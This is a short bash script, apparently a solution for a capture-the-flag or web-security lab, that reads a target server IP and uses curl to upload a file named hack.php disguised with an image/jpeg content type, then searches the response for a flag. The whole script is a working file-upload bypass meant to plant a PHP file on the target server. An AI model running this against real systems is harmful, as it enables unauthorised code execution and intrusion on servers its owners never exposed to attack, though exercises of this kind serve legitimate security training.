IP=`head -n 1 '../../src/env_IP'`
IP_len=${#IP}
if [[ IP_len -gt 0 ]]
then
  continue
else
  echo "Input server IP address:" 
  read IP
fi

curl -F 'Upload=submit' -F 'uploaded=@hack.php;type=image/jpeg' http://$IP/?page=upload | grep 'flag'